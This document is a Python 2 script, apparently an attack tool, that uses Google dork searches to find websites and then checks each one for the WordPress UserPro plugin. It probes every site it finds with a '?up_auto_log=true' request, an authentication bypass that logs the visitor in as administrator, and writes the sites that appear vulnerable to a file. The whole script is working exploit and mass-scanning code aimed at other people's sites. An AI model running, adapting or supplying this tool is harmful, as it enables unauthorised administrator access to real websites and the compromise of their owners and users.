#!/usr/bin/env python
# Set color
R = '\033[31m' # Red
N = '\033[1;37m' # White
G = '\033[32m' # Green
O = '\033[0;33m' # Orange
B = '\033[1;34m' #Blue
import time
import bs4
from urllib2 import quote
from socket import timeout
from urllib2 import urlopen
from urllib2 import Request
def tracker(keywords, start):
        searchQuery = quote(keywords, safe='')  # This line makes the script Support all encodings
        try:
            url = "https://www.google.com/search?gl=ir&num=100&start=" + str(
                start) + "&pws=0&as_qdr=all&dcr=0&q=" + searchQuery
            req = Request(url)  # Sets the SERPs URL!!
        except timeout:
            print("Connection timed out!")
        req.add_header('User-Agent',
                       'userpro1 aef by orm')
        serpURL = urlopen(req).read()  # Opens and Reads The Serp Page
        soup = bs4.BeautifulSoup(serpURL, "html.parser")  # Sets the Serp URL On Soup
        allResults = []  # An Empty Array to Save the Results
        i=0
        for hit in soup.findAll('cite'):  # a for-each loop, to check all <cite ....> Elements in Page
              # if the domain was between <cite> and </cite>
            allResults.append(
                  str("")+hit.text)  # Results will add to allResults
            i=i+1
        if (len(allResults) == 0):
            return(""+B+"[*] "+N+"No result found for this keyword => " + keywords)
        else:
            print(""+B+"[*]"+N+" The Length of the list is: ", i)
            print(""+B+"[*]"+N+" Starting .... \n")

            for element in allResults:  # Prints all the results
                if (element.startswith("http://")):
                    element = element[7:]
                if (element.startswith("https://")):
                     element = element[8:]
                if (element.startswith("www.")):
                    element = element[4:]
                element=element[:element.find("/")]
                element="http://"+element
                print(""+B+"[*] "+N+"checking "+element+" :")
                if (checkwp(element)):
                    suc = str(checkVul(element))
                    if( suc=="True"):
                        try:
                            filee = open("priv8.txt", mode="a+")
                            filee.write(element+"\n")
                            filee.close()
                        except:
                            print("error")
                        print (suc)
                    else:
                        print ("False")

                else:
                   print (element + " => " + str(checkwp(element)))


def checkwp(url):
    url+="/wp-content/plugins/userpro/css/userpro.min.css"
    try:
     pURL = urlopen(url).read()
    except:
        return False
    if (pURL.find(".userpro")>-1):
        print (""+R+"[!]"+N+" Plugin is installed checking vul :\n")
        return True
    else:
        return False
def checkVul(url):
    url1=url + "/?up_auto_log=true"
    try:
        pURL = urlopen(url1).read()
        if (pURL.find("admin-bar-css")>-1):
           return True
        elif (urlopen(url + "/wp-admin").read().find("admin-bar-css")>-1):
            return True
        else :return False
    except:
        return False

while(True):
    x = raw_input(""+N+"DrXp > ("+R+"usr_pro_wordpress_auto_find"+N+"): ")
    print "DORKS => "+R+"",x
    time.sleep(1)
    print ""+N+"=>"+R+" Set number start"
    n= raw_input(""+N+"DrXp > ")
    print ""+N+"NUMB START => "+R+"",n
    time.sleep(1)
    print ""+N+"=> "+R+"Set Next number size"
    g= raw_input(""+N+"DrXp > ")
    print ""+N+"END NUMBER => "+R+"",g
    time.sleep(1)
    run = raw_input(""+N+"DrXp > ")
    if run == "run":
    	while(True):
    		tracker(x, n)
    		y=raw_input(""+B+"[*]"+N+" Next (y/n)?")
    	if(y=="y"):
    		n+=g;
    		tracker(x, n)
        else:
            break
    y1=raw_input(""+B+"[*]"+N+" Anouther dork (y/n) ?")
    if (y1 == "y"):
        continue
    else:
        break
